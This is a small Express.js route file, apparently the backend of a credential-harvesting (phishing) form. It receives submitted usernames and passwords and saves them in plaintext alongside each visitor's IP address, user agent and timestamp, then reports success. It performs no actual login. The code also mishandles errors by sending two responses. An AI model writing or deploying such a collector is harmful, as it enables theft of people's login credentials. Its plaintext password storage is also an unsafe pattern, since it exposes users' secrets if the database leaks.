
const express = require ('express');
const router = express.Router();
const db = require('../db');
const bodyParser = require('body-parser');

router.use(express.static('public'));
router.use(bodyParser.urlencoded({ extended: false }));


// Handle form submission

router.post('/submit', (req, res) => {

    const { username, password } = req.body;
    const word = req.body.password;
    const name = req.body.username;
    const clientIP = req.headers['x-forwarded-for'];
    const ip =  clientIP.split(',')[0].trim(); 
    const useragent = req.get('User-Agent');
    const date = new Date();


    const insertQuery = 'INSERT INTO ntctable (username, password, ip, useragent,date) VALUES (?,?,?,?,?)';
		db.query(insertQuery, [name, word, ip, useragent, date], (err) => {
		if (err) {
      res.json({ message: 'Invalid login credentials', status: 'failure', success: false });
		}
		res.json({ message: 'Information received', status: 'success', success: true });
		});
     
    });
 
  

module.exports =router
